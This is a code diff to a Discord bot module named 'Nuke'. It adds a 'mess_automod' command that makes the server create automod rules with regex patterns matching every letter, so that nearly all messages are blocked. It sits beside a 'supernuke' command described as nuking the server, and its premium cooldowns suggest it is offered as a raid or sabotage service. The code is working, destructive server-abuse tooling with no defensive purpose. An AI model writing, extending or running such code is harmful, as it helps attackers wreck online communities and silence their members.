@@ -143,6 +143,34 @@ class Nuke(commands.Cog):
         await ctx.send(f"Deleted {deleted} automod rule(s).")
 
     @blacklisted_command()
+    @premium_cooldown(1, 30)
+    @commands.command(
+        name="mess_automod",
+        aliases=["ma", "massautomod"],
+        help="Create automod rules to block all alphabetical letters")
+    async def mess_automod(self, ctx: commands.Context):
+        alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        patterns_per_rule = 20
+        chunks = [alphabet[i:i + patterns_per_rule] for i in range(0, len(alphabet), patterns_per_rule)]
+
+        created = 0
+        for i, chunk in enumerate(chunks):
+            regex_patterns = [f".*{char}.*" for char in chunk]
+            try:
+                await ctx.guild.create_automod_rule(
+                    name=f"Mess Automod {i+1}/{len(chunks)}",
+                    trigger_type=discord.AutoModTriggerType.keyword,
+                    actions=[discord.AutoModBlockMessageAction()],
+                    enabled=True,
+                    regex_patterns=regex_patterns,
+                )
+                created += 1
+            except Exception as e:
+                print(f"Failed to create automod rule {i+1}: {e}")
+
+        await ctx.send(f"Created {created} automod rule(s) to block alphabetical characters.")
+
+    @blacklisted_command()
     @commands.command(name="supernuke", aliases=["sn", "skill", "superkill"], help="Super nuke the server (once per guild)")
     @commands.has_permissions(administrator=True)
     async def supernuke(self, ctx: commands.Context):
